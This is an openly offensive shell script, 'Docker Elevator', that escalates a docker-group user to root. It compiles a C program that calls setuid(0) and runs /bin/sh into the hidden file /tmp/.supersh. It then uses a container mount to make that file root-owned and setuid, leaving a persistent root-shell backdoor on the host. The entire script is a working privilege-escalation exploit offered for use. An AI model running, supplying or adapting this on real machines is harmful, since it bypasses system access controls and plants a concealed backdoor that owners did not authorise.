#!/bin/sh

# Docker Elevator - Privilege Escalation by Docker
#
# Version: 1.0.0
# Author : evi0s
# Usage  : chmod +x elevator.sh && ./elevator.sh


# Setting PATH
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/.local/bin
export PATH


# Check command exists
cmd_exist() {

    local ret='0'
    command -v $1 > /dev/null 2>&1 || { local ret='1';  }

    # Fail on non-zero return value
    if [ "$ret" -ne 0  ]; then
        return 1
    fi

    return 0
}

# Colored messages
color_msg() {
    echo "\e[0;$2m$1\e[0m"
}

msg_info() {
    echo $(color_msg "[I] $1" 34)
}

msg_error() {
    echo $(color_msg "[E] $1" 31)
}


# Check compiler
check_gcc() {
    msg_info "Checking gcc..."

    cmd_exist gcc

    if [ $? -ne 0 ]; then
        msg_error "GCC not found!"
        exit
    fi

    msg_info "gcc found: $(gcc --version | head -n 1)"
}

# Check Docker
check_docker() {
    msg_info "Checking docker..."

    cmd_exist docker

    if [ $? -ne 0 ]; then
        msg_error "Docker required!"
        exit
    fi

    msg_info "Docker found: $(docker -v)"
}

# Check group
check_group() {
    msg_info "Checking user group..."

    local ret='0'

    groups | grep docker > /dev/null 2>&1 || { local ret='1'; }

    if [ $ret -ne 0 ]; then
        msg_error "Current user is not in docker group!"
        exit
    fi

    msg_info "User group ok: $(groups)"
}

# check_permission
check_permission() {
    msg_info "We are going to pull an alpine image to check permission"
    docker pull alpine:3.12

    if [ $? -ne 0 ]; then
        msg_error "Insufficient permission or an error occurred!"
        exit
    fi

    msg_info "Permission ok."
}

# Put source
write_src() {
    cat > /tmp/source_ofthishandwritting.c << EOF
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/sh");
    return 0;
}
EOF
}

# Compile source
compile_src() {
    msg_info "Compiling source..."

    gcc /tmp/source_ofthishandwritting.c -o /tmp/.supersh

    if [ $? -ne 0 ]; then
        msg_error "An error has occurred!"
        exit
    fi

    msg_info "Source compiled"
}

# Start escalation
start() {
    msg_info "Creating container..."

    docker run \
        --rm -v /tmp/.supersh:/tmp/supersh alpine:3.12 \
        sh -c "chown root.root /tmp/supersh && chmod u+s /tmp/supersh && exit"

    if [ $? -ne 0 ]; then
        msg_error "An error has occurred!"
        exit
    fi

    msg_info "All done!"
    msg_info "Now you can spawn a root shell by executing /tmp/.supersh"
}

# Clean up
clean_up() {
    msg_info "Cleaning up environment..."
    rm -rf /tmp/source_ofthishandwritting.c
    docker rmi alpine:3.12
}

main() {
    check_group
    check_gcc
    check_docker
    check_permission

    write_src
    compile_src
    start
    clean_up
}

main

